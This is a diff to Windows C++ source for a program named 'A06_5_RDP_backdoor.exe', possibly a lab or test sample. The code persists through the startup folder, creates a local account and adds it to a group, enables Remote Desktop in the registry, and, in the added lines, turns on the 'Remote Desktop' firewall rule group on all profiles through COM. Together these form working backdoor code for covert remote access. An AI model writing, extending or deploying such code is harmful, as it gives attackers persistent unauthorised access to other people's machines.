@@ -1,12 +1,16 @@
 #include <windows.h>
 #include <lm.h>
 #include <shlobj.h>
+#include <netfw.h>
 #include <iostream>
 #include <string>
 
-#pragma comment(lib, "netapi32.lib")
-#pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "shell32.lib")
+// Linker Pragmas - Resolves all external symbol dependencies internally
+#pragma comment(lib, "netapi32.lib") // For NetUserAdd and NetLocalGroupAddMembers
+#pragma comment(lib, "advapi32.lib") // For Registry manipulation APIs
+#pragma comment(lib, "shell32.lib")  // For SHGetFolderPathW
+#pragma comment(lib, "ole32.lib")    // For COM Initialization (CoInitializeEx)
+#pragma comment(lib, "oleaut32.lib") // For COM BSTR Management (SysAllocString/SysFreeString)
 
 // Configuration Constants
 const wchar_t *TARGET_EXE_NAME = L"A06_5_RDP_backdoor.exe";
@@ -44,7 +48,7 @@ bool InstallToStartupFolder()
     return false;
 }
 
-// Phase 2: Native Account Creation and RDP Backdoor Configuration
+// Phase 2: Native Account Creation, RDP Configuration, and Firewall Modification
 bool ConfigureRDPBackdoor()
 {
     USER_INFO_1 ui;
@@ -89,6 +93,31 @@ bool ConfigureRDPBackdoor()
         DWORD dwDenyConnections = 0; // 0 = Allow connections
         RegSetValueExW(hKey, L"fDenyTSConnections", 0, REG_DWORD, (const BYTE *)&dwDenyConnections, sizeof(dwDenyConnections));
         RegCloseKey(hKey);
+    }
+
+    // 5. Natively Enable the "Remote Desktop" Firewall Rule Group via COM
+    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+    if (SUCCEEDED(hr) || hr == RPC_E_CHANGED_MODE)
+    {
+        INetFwPolicy2 *pNetFwPolicy2 = NULL;
+        hr = CoCreateInstance(
+            CLSID_NetFwPolicy2,
+            NULL,
+            CLSCTX_INPROC_SERVER,
+            IID_INetFwPolicy2,
+            (void **)&pNetFwPolicy2);
+
+        if (SUCCEEDED(hr))
+        {
+            BSTR groupName = SysAllocString(L"Remote Desktop");
+
+            // Set Enable to TRUE for the entire localized rule group across all profiles
+            pNetFwPolicy2->EnableRuleGroup(NET_FW_PROFILE2_ALL, groupName, VARIANT_TRUE);
+
+            SysFreeString(groupName);
+            pNetFwPolicy2->Release();
+        }
+        CoUninitialize();
     }
 
     return true;
